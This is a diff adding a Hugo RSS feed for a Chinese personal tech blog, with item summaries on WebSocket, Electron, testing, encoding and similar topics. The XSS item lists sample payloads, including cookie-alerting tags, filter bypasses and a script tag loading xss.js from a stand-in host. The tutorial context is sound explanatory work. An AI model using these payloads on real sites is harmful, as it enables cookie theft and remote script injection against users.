@@ -1,0 +1,568 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>随记 on AC-LM &#39;s blog</title>
+    <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/</link>
+    <description>Recent content in 随记 on AC-LM &#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 27 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>随记(38)——Socket.IO</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B038socket.io/</link>
+      <pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B038socket.io/</guid>
+      <description>Introduction @Socket.IO 
+ 1.工作原理 Socket.IO 是 Websocket 的一个实现，其分为服务器（node.js）和客户端（浏览器、node.js或其他编程语言）。服务器与客户端之间的双向通道使用 Websocket 连接建立，并使用 HTTP 长轮询作为回退。
+Socket.IO 代码库分为两个不同的层：
+ 低级管道：我们称之为 Engine.IO，作为 Socket.IO 的内部发动机 高级别 API： Socket.IO 本身  2.Engine.IO Engine.IO 负责建立服务器和客户端之间的低级连接。它处理：
+ 各种数据运输和升级机制 断开检测  a.运输 目前有两个已实现的运输：
+ HTTP 长轮询 Websocket  b.握手 在 Engine.IO 连接的开始，服务器会发送一些信息：
+{ &amp;#34;sid&amp;#34;: &amp;#34;FSDjX-WRwSA4zTZMALqx&amp;#34;, &amp;#34;upgrades&amp;#34;: [&amp;#34;websocket&amp;#34;], &amp;#34;pingInterval&amp;#34;: 25000, &amp;#34;pingTimeout&amp;#34;: 20000 }  sid 是会话的 ID，它必须包含在所有后续 HTTP 请求中的查询参数中 upgrades 包含由服务器支持的所有链接列表 pingInterval 与 pingTimeout 的值用于心跳机制，以检查连接状态  c.升级机制 默认情况下，客户端会先与 HTTP 长轮询传输建立连接。</description>
+    </item>
+    
+    <item>
+      <title>随记(37)——Websocket</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B037websocket/</link>
+      <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B037websocket/</guid>
+      <description>1.Websocket 简介 Websocket 被定义为服务器和客户端之间的双向通信，这意味着双方同时进行通信和交换数据。
+Websocket 的关键点是真正的并发性和性能优化，从而产生响应更快，更丰富的 Web 应用程序。
+Websocket 的 URL 为 ws://example.com:8000/chat.php</description>
+    </item>
+    
+    <item>
+      <title>随记(36)——Electron应用程序框架</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B036electron-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/</link>
+      <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B036electron-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/</guid>
+      <description>参考文档 Electron：PC 端多端融合方案  Electron 应用调试指南 
+ Electron Electron 是一个基于 Node.js 和 Chromium 的开源框架，常用于构建桌面应用，开发者可以使用 web 技术（HTML，JavaScript 和 CSS）完成整个应用的开发。许多知名桌面应用基于 Electron 实现，如 VSCode，Slack 和 GitHub Desktop 等。
+Electron 应用进程分为主进程和渲染进程，其底层实现分别对应于 Node.js 和 Chromium，和 Native 中的概念不一样的是 Electron 中主进程只有一个，而渲染进程（也就是 UI 进程） 可以有多个。主进程在后台运行，每次打开一个界面，会新开一个新的渲染进程。
+ 渲染进程： 用户看到的 web 界面就是由渲染进程绘制出来的，包括 html、css、js。 主进程：Electron 运行 package.json 中的 main.js 脚本的进程被称为主进程。在主进程中运行的脚本通过创建 web 页面来展示用户界面。一个 Electron 应用程序总是只有一个主进程。  Chromium 架构 浏览器分为单进程和多进程架构。下面先讲讲 Chrome 为代表的浏览器过去和未来。
+单进程浏览器 单进程浏览器指的是浏览器的所有功能模块都是运行在同一个进程里的，这些模块包括网络、插件、Javascript 运行环境、渲染引擎和页面等。如此复杂的功能都在一个进程内运行，所以容易导致浏览器的不稳定、不安全、不流畅。
+问题1: 不稳定 早期浏览器需要借助插件来实现类似 Web 视频、Web 游戏等各种强大的功能。但插件往往是最容易出现问题的模块。此外因为运行在浏览器进程中，所以一个插件的意外崩溃会导致整个浏览器的崩溃。除了插件之外，渲染引擎模块也是不稳定的。通常一些复杂的 Javascript 代码就有可能导致渲染引擎模块的崩溃。</description>
+    </item>
+    
+    <item>
+      <title>随记(35)——如何给hugo博客添加搜索功能</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B035%E5%A6%82%E4%BD%95%E7%BB%99-hugo-%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</link>
+      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B035%E5%A6%82%E4%BD%95%E7%BB%99-hugo-%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</guid>
+      <description>参考原文：给Hugo站点添加搜索功能 - Go语言中文网
+ 实现思路  利用 hugo 生成的 index.xml 文件进行内容搜索。路径 public &amp;gt; index.xml。文件包含博客所有文章的标题，链接和概要。 JavaScript 实现如下  if(window.location.pathname === &amp;#39;/404.html&amp;#39;){ query = window.location.search.substr(1) if(query){ searchKey = query.replace(&amp;#39;query=&amp;#39;, &amp;#39;&amp;#39;) // $(&amp;#39;#404&amp;#39;).text(decodeURI(searchKey)); 	$(&amp;#39;#404&amp;#39;).text(&amp;#39;搜索结果&amp;#39;) $.get(&amp;#39;/index.xml&amp;#39;, function(data){ items = data.getElementsByTagName(&amp;#34;item&amp;#34;); var i = 0; var node = &amp;#39;&amp;#39; while ( i &amp;lt; items.length) { txt = items[i].getElementsByTagName(&amp;#34;title&amp;#34;)[0].innerHTML + items[i].getElementsByTagName(&amp;#34;description&amp;#34;)[0].innerHTML; if((txt.indexOf(searchKey)) &amp;gt; -1){ var title = items[i].getElementsByTagName(&amp;#34;title&amp;#34;)[0].innerHTML; console.log(items[i].getElementsByTagName(&amp;#34;description&amp;#34;)[0].innerHTML); var link = items[i].getElementsByTagName(&amp;#34;link&amp;#34;)[0].innerHTML; node = node + &amp;#39;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;&amp;#39; + link + &amp;#39;&amp;#34;&amp;gt;&amp;#39; + title + &amp;#39;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; }; i++; } div = document.</description>
+    </item>
+    
+    <item>
+      <title>随记(34)——性能测试</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B034%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</link>
+      <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B034%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</guid>
+      <description>按我个人的理解：性能测试的最终目的是：测试产品的服务能否在高负载情况下保持稳定
+什么是产品的服务 这里的产品指的是 B/S（浏览器/服务器）和 C/S（客户机/服务器） 这类架构的服务器。我们的性能测试主要针对的也就是这类服务器提供的各种服务，比如搜索，提交数据，下载资源等，通常这类服务在网络上体现为一个个接口，而我们的性能测试，大部分也就是对这些接口进行测试。比如百度的搜索接口
+http://www.baidu.com/s?wd=关键字&amp;amp;cl=类型&amp;amp;pn=页码&amp;amp;ie=gb2312&amp;amp;rn=显示条数&amp;amp;tn=原站点
+高负载是指什么 上述我们知道产品大部分是指服务器，而服务器的高负载通常也就几个：内存，CPU，硬盘读写，网络带宽，这类计算机系统指标。要触发这些指标的高负载，并发是不错的操作之一
+如何判断系统的稳定 如何判断系统的稳定，也就是性能测试的断言。最简单的方法是在性能测试时，自己使用产品观看效果，观察产品能不能正常使用，使用的体验好不好，这些都是最直观的判断依据。或者你可以登录服务器后台，查看服务器的资源占用率，通过这来判断系统是否正常。而对于Web服务，除了上述的断言方法，还可以使用 [随记(11)——Web性能测试的指标](LM (ac-lm.github.io)
+如何测试  定位服务：确定需要测试的内容，定位到最小的单位。比如需要测试系统最多支持多少人同时登录，那我们只需构造线程并发测试系统的登录接口便可以，而不需要考虑打开网页等内容。 构造高负载情况：通过各种方式在服务器端构造一个高负载的环境 断言：使用各种方法来判断系统是否处于稳定状态 编写报告：根据断言编写报告  </description>
+    </item>
+    
+    <item>
+      <title>随记(33)——网页截长图</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B033%E7%BD%91%E9%A1%B5%E6%88%AA%E9%95%BF%E5%9B%BE/</link>
+      <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B033%E7%BD%91%E9%A1%B5%E6%88%AA%E9%95%BF%E5%9B%BE/</guid>
+      <description>F12开发者工具 Ctrl+Shift+P打开命令查找窗口，输入截图或screenshot / Capture full size screenshot，查找截长图选项</description>
+    </item>
+    
+    <item>
+      <title>随记(32)——URL编码</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B032url-%E7%BC%96%E7%A0%81/</link>
+      <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B032url-%E7%BC%96%E7%A0%81/</guid>
+      <description>什么是UrlEncode UrlEncode 是一个函数，作用是将字符串以 URL 编码，是特定上下文的统一资源定位符（URL）的编码机制，最终使 HTML 数据安全提交。
+函数会将字符串以URL编码，例如空格编码为加号，常规网页中的表单数据传送就是用 UrlEncode 编码后再送出。
+部分转换规则如下：
+   空格 ! # $ % + @ : = ?     %20 %21 %23 %24 %25 %2B %40 %3A %3D %3F    在ASP Server.URLEncode(&amp;quot;内容&amp;quot;)在PHP urlencode(&amp;quot;内容&amp;quot;);在JSP URLEncoder.encode(&amp;quot;要转码的内容&amp;quot;);在Python urllib.parse.unquote(&amp;quot;内容&amp;quot;)</description>
+    </item>
+    
+    <item>
+      <title>随记(31)——M3U8文件</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B031m3u8-%E6%96%87%E4%BB%B6/</link>
+      <pubDate>Thu, 05 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B031m3u8-%E6%96%87%E4%BB%B6/</guid>
+      <description>参考原文：m3u8到底是什么格式？ @星选酷 
+ 1.视频播放的过程 要了解 m3u8 文件格式，首先要了解现在视频播放的过程。现在的视频网站采用的是流媒体传输协议，就是将一段视频分割成无数个小段，每一个小段就是一个 ts 格式的视频文件，然后传输到视频网站上一段一段的播放。这样做的好处是能使用户观看更加流畅，因为在观看过程中网站会根据网络状况自动切换视频的清晰度，下载不同分辨率的 ts 视频文件，在网络状况不稳定的情况下，对保障流畅播放非常有帮助。
+ 服务器采集编码传输视频到切片器 切片器对视频创建索引文件，并且切割成n个ts文件 这2个文件传输到http服务器上 网站/客户端根据索引文件查找http服务器上的ts文件，连续播放这n个ts文件，就可以了。  这个索引文件就是 M3U8 ，索引文件里面存储着 ts 文件的网络 url 链接，网站需要拿到索引文件，按照 url 链接下载在 http 服务器中的 ts文件，类似于爬虫，所有 ts 文件顺序播放，就完成了整个视频的播放。
+扩展阅读 M3U（Moving Picture Experts Group Audio Layer 3 Uniform Resource Locator）是音频文件的列表文件，是纯文本文件，记录着视频资源的网络地址。
+M3U8 就是 M3U 的 UTF-8 格式文件</description>
+    </item>
+    
+    <item>
+      <title>随记(30)——多进程与多线程与协程</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B030%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%8D%8F%E7%A8%8B/</link>
+      <pubDate>Wed, 04 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B030%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%8D%8F%E7%A8%8B/</guid>
+      <description> 参考原文：多进程，多线程，协程的理解_@qq_43279936 
+ 1.什么是进程？什么是线程？   进程是表示资源分配的基本单位，是调度运行的基本单位。当用户运行自己的程序时，系统就创建一个进程，并为它分配包括内存空间、磁盘空间、I/O设备等资源。然后，把该进程放入进程的就绪队列中等待被系统执行。当该进程被系统的进程调度程序选中后，系统会为它分配CPU以及其它资源，运行该进程。
+  线程是进程中执行运算的最小单位，如果把进程理解为在逻辑上操作系统所完成的任务，那么线程表示完成该任务的许多可能的子任务之一。线程与进程的包含关系如下图所示。
+  2.多进程和多线程的区别？ a.数据共享、同步  多进程：不共享数据，数据交换需要用IPC(进程间通信)，数据因此同步简单 多线程：共享进程数据，数据处理交换方便，数据因此同步复杂  b.内存、CPU  多进程：占用内存多，切换复杂，CPU利用率低 多线程：占用内存少，切换简单，CPU利用率高  c.创建销毁、切换  多进程：创建销毁、切换复杂，速度慢 多线程：创建销毁、切换简单，速度快  d.编程、调试  多进程：编程简单，调试简单 多线程：编程复杂，调试复杂  e.可靠性  多进程：进程间互不影响，一个进程挂了，程序也不会整个挂掉 多线程：线程影响着进程，一个线程挂掉，将导致整个进程挂掉  3.进程间或线程间的通信方式  进程：管道， 信号量， 信号， 消息队列， 共享内存， 套接字 线程：锁机制（互斥锁、条件变量、读写锁），信号量机制(Semaphore)，信号机制(Signal)  4.什么是协程 协程(Coroutine)，又称微线程，纤程，是单线程语言中用来模拟多线程的一种方式。协程的作用，是在执行部分耗时长的函数时，可以先中断执行，去处理其他耗时短的函数，等到空闲时再继续执行该耗时长的函数，最终使得这一整个过程看上去像多线程。
+5.协程优势  执行效率极高，因为子程序切换(函数)不是线程切换，仅仅是函数的切换，没有切换线程的开销。所以与多线程相比，线程的数量越多，协程性能的优势越明显。 不需要多线程的锁机制，因为是单线程，所以不存在同时写变量冲突，在控制共享资源时也不需要加锁，因此执行效率高很多。  </description>
+    </item>
+    
+    <item>
+      <title>随记(29)——Xml可扩展标记语言</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B029xml-%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/</link>
+      <pubDate>Tue, 03 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B029xml-%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/</guid>
+      <description>XML 是纯文本格式，在许多方面类似于 HTML。XML 由 XML 元素组成，每个 XML 元素包括一个开始标记 &amp;lt;&amp;gt; ，一个结束标记 &amp;lt;/&amp;gt; 以及两个标记之间的内容。标记是对文档存储格式和逻辑结构的描述，可以包括注释、引用、字符数据段、起始标记、结束标记、空元素、文档类型声明 ( DTD ) 和序言。
+编写规则  必须有声明语句，作为 XML 文档的第一句，其格式如下：  &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt; 区分大小写  在XML文档中，大小写是有区别的。A 和 a 是不同的标记。因此注意在写元素时，前后标记的大小写要保持一致。
+XML文档有且只有一个根元素  标准格式的 XML 文档有且仅有一个根元素，紧接着声明后面建立，其他元素都是这个根元素的子元素，根元素完全包括文档中其他所有的元素。根元素的起始标记要放在所有其他元素的起始标记之前，根元素的结束标记要放在所有其他元素的结束标记之后。
+属性值使用引号  在HTML代码里面，属性值可以加引号，也可以不加。但是XML规定，所有属性值必须加引号，否则将被视为错误。
+所有的标记必须有相应的结束标记  在HTML中，标记可以不成对出现，而在XML中，所有标记必须成对出现，有一个开始标记，就必须有一个结束标记，否则将被视为错误。
+所有的空标记也必须被关闭  在XML中，规定所有的标记必须有结束标记。
+示例 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt; &amp;lt;manifest xmlns:android=&amp;#34;http://schemas.android.com/apk/res/android&amp;#34; package=&amp;#34;osg.AndroidExample&amp;#34; android:installLocation=&amp;#34;preferExternal&amp;#34; android:versionCode=&amp;#34;1&amp;#34; android:versionName=&amp;#34;1.0&amp;#34;&amp;gt; &amp;lt;uses-sdk android:targetSdkVersion=&amp;#34;8&amp;#34; android:minSdkVersion=&amp;#34;8&amp;#34;&amp;gt;&amp;lt;/uses-sdk&amp;gt; &amp;lt;uses-feature android:glEsVersion=&amp;#34;0x00020000&amp;#34;/&amp;gt; &amp;lt;uses-permission android:name=&amp;#34;android.permission.INTERNET&amp;#34;/&amp;gt; &amp;lt;application android:label=&amp;#34;@string/app_name&amp;#34; android:icon=&amp;#34;@drawable/osg&amp;#34;&amp;gt; &amp;lt;activity android:name=&amp;#34;.osgViewer&amp;#34; android:label=&amp;#34;@string/app_name&amp;#34; android:screenOrientation=&amp;#34;landscape&amp;#34;&amp;gt; &amp;lt;intent-filter&amp;gt; &amp;lt;action android:name=&amp;#34;android.</description>
+    </item>
+    
+    <item>
+      <title>随记(28)——使用Gitee&#43;PicGo搭建图床</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B028%E4%BD%BF%E7%94%A8-gitee&#43;picgo-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</link>
+      <pubDate>Sun, 25 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B028%E4%BD%BF%E7%94%A8-gitee&#43;picgo-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</guid>
+      <description>1.PicGo 软件：Molunerfinn/PicGo · GitHub 
+插件：gitee-uploader
+PS：注意插件的安装需要环境由node.js，nodejs.org 
+2.Gitee 1.新建一个公有仓库
+2.配置私人令牌(token)，在设置中找到安全设置，点击私人令牌
+3.点击新建，仅选择下图两项，提交并验证密码后会展示token，记录下来，后面操作会使用到。（注意：这个令牌只会明文显示一次）
+3.PicGO配置 1.选择图床设置，选择gitee
+2.进行配置
+ repo：用户名/仓库名称（仓库地址后面那一段） branch：分支，填写master token：填入前面获取的私人令牌 path：路径，一般填写img customPath：提交消息，可不填 customURL：自定义地址，可不填  3.上传区选择gitee便可上传图片</description>
+    </item>
+    
+    <item>
+      <title>随记(27)——用例设计</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B027%E7%94%A8%E4%BE%8B%E8%AE%BE%E8%AE%A1/</link>
+      <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B027%E7%94%A8%E4%BE%8B%E8%AE%BE%E8%AE%A1/</guid>
+      <description>1.测试用例都是可执行的 用例要想可执行，第一条原则是，不要包含一些似是而非的词语，比如是不是，要不要，有没有之类的。换句话说，就是用例里大概率要么包含是，要么包含不是这样的词。比如
+ 装盐的袋子不能（不是）漏 衣服的颜色是红的 衣服的材料是80%的棉，20%的涤纶  像这样的是或者不是的句型，我们可以称之为断言。设计用例的最基本要求——可以执行，没有歧义。
+2.用例的3A原则  Arrange: 初始化测试对象或者准备测试数据 Act : 调用被测方法 Assert: 断言  </description>
+    </item>
+    
+    <item>
+      <title>随记(26)——正则的相关</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B026%E6%AD%A3%E5%88%99%E7%9A%84%E7%9B%B8%E5%85%B3/</link>
+      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B026%E6%AD%A3%E5%88%99%E7%9A%84%E7%9B%B8%E5%85%B3/</guid>
+      <description>1.完全匹配 [\s\S]*：完全通配，\s 是指空白，包括空格，换行，Tab等所有的空白，而 \S 刚好相反，表示字符，这样一正一反下来，就表示所有。
+[]：表示在它里面包含的单个字符不限顺序的出现。
+2.除换行\n外匹配 (.*)：通配符.是不会匹配换行的，当出现换行时匹配便会终止。</description>
+    </item>
+    
+    <item>
+      <title>随记(25)——罗技M170拆解</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B025%E7%BD%97%E6%8A%80-m170-%E6%8B%86%E8%A7%A3/</link>
+      <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B025%E7%BD%97%E6%8A%80-m170-%E6%8B%86%E8%A7%A3/</guid>
+      <description>参考原文：如何拆解罗技M170鼠标？ @WXLJJ 
+ 打开后盖，如图所示，有三个卡扣。</description>
+    </item>
+    
+    <item>
+      <title>随记(24)——音视频开发</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B024%E9%9F%B3%E8%A7%86%E9%A2%91%E5%BC%80%E5%8F%91/</link>
+      <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B024%E9%9F%B3%E8%A7%86%E9%A2%91%E5%BC%80%E5%8F%91/</guid>
+      <description>参考原文：从开发小白到音视频专家 @卢俊 
+ 音视频开发，就是要掌握图像、音频、视频的基础知识，并且学会如何对它们进行采集、渲染、处理、传输等一系列的开发和应用。
+ 采集：它解决的是，数据从哪里来的问题 渲染：它解决的是，数据怎么展现的问题 处理：它解决的是，数据怎么加工的问题 传输：它解决的是，数据怎么共享的问题  每一个门类，都可以深挖，衍生出一个又一个充满技术挑战的话题，比如：如何更高效地渲染画面、如何提高音视频的压缩比，如何优化弱网下的音视频数据传输等等。
+1.采集 采集，它解决的是，数据从哪里来的问题，那么，数据究竟从哪里来的呢 ？
+其实无论在哪个平台，图像、视频最初都是来自摄像头，而音频最初都是来自麦克风，因此，做音视频采集，就要掌握如下的技术知识：
+ 系统的摄像头采集接口是什么，怎么用？比如：Windows：DirectShow，Linux：V4L2，Android：Camera，iOS：AVCaptureSession 系统的摄像头采集的参数怎么配置，都是什么含义 ？比如：分辨率、帧率、预览方向、对焦、闪光灯 等 系统的摄像头输出的图像/视频数据，是什么格式，不同格式有什么区别 ？比如：图片：JPEG；视频数据：NV21，NV12，I420 等 系统的麦克风采集接口是什么，怎么用 ？比如：Windows：DirectShow，Linux：ALSA &amp;amp; OSS，Android：AudioRecord，iOS：Audio Unit 系统的麦克风采集参数怎么配置，都是什么含义 ？比如：采样率、通道号、位宽等 系统的麦克风输出的音频数据，是什么格式？比如：PCM  2.渲染 渲染，它解决的是，数据怎么展现的问题，那么，数据究竟怎么展现呢 ？
+其实无论在哪个平台，图像、视频最终都是要绘制到视图上面，而音频最终都是要输出到扬声器，因此，做音视频渲染，就要掌握如下的技术知识：
+ 系统提供了哪些 API 可以绘制一张图片或者一帧 YUV 图像数据的 ？比如：Windows：DirectDraw, Direct3D, GDI，OpenGL 等，Linux： GDI， OpenGL 等，Android：ImageView，SurfaceView，TextureView，OpenGL 等，iOS： CoreGraphics，OpenGL 等 系统提供了哪些 API 可以播放一个 mp3 或者 pcm 数据 ？比如：Windows：DirectSound 等，Linux：ALSA &amp;amp; OSS 等，Android：AudioTrack 等，iOS： AudioQueue 等  3.</description>
+    </item>
+    
+    <item>
+      <title>随记(23)——XSS攻击</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B023xss-%E6%94%BB%E5%87%BB/</link>
+      <pubDate>Tue, 30 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B023xss-%E6%94%BB%E5%87%BB/</guid>
+      <description>参考原文：XSS(跨站脚本攻击)详解 @615 
+ 1.简单介绍 HTML注入与XSS攻击简单来说就是当用户在输入框输入内容，后台对输入内容不做处理直接添加入页面。此时，用户就可以刻意填写HTML、JavaScript脚本来作为文本输入，这样这个页面就会出现一些用户加入的东西了，这是一种脚本注入。
+&amp;lt;a href=http://www.baidu.com&amp;gt;Click Me&amp;lt;/a&amp;gt; 当然有些稍微有点脑子的网站会屏蔽 script 标签的输入，但是我们大可以利用类似于以下的语句注入脚本。
+&amp;lt;img src=1 οnerrοr=alert(1) /&amp;gt; &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt; 因此，相比起过滤script标签，建议采用更加高明的过滤&#39;&amp;lt;&#39;&#39;&amp;gt;&#39;&#39;&amp;amp;&amp;lsquo;等符号。事实上html定义了几个特定符号专门用来表示这几个符号的，比如用&amp;amp;amp来代替&amp;amp;符号等。
+2.XSS 跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！
+XSS攻击主要分为以下三种
+ 存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie 反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息 DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。可能触发DOM型XSS的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法进行赋值或其他操作  3.XSS的攻击载荷 以下所有标签的 &amp;gt; 都可以用 // 代替
+script标签 &amp;lt;script&amp;gt;alert(&amp;#34;hack&amp;#34;)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(/hack/)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; #弹出1，对于数字可以不用引号 &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; #弹出cookie &amp;lt;script src=http://xxx.com/xss.js&amp;gt;&amp;lt;/script&amp;gt; #引用外部的xss svg标签 &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;&amp;gt; &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;// img标签 &amp;lt;img src=1 οnerrοr=alert(&amp;#34;hack&amp;#34;)&amp;gt; &amp;lt;img src=1 οnerrοr=alert(document.cookie)&amp;gt; #弹出cookie body标签 &amp;lt;body οnlοad=alert(1)&amp;gt; &amp;lt;body οnpageshοw=alert(1)&amp;gt; video标签 &amp;lt;video οnlοadstart=alert(1) src=&amp;#34;/media/hack-the-planet.</description>
+    </item>
+    
+    <item>
+      <title>随记(22)——视频推流与拉流</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B022%E8%A7%86%E9%A2%91%E6%8E%A8%E6%B5%81%E4%B8%8E%E6%8B%89%E6%B5%81/</link>
+      <pubDate>Mon, 29 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B022%E8%A7%86%E9%A2%91%E6%8E%A8%E6%B5%81%E4%B8%8E%E6%8B%89%E6%B5%81/</guid>
+      <description>参考原文：视频推流与拉流 
+ 1.推流 推流，指的是把采集阶段封包好的内容传输到服务器的过程。主流的推送协议和优缺点如下
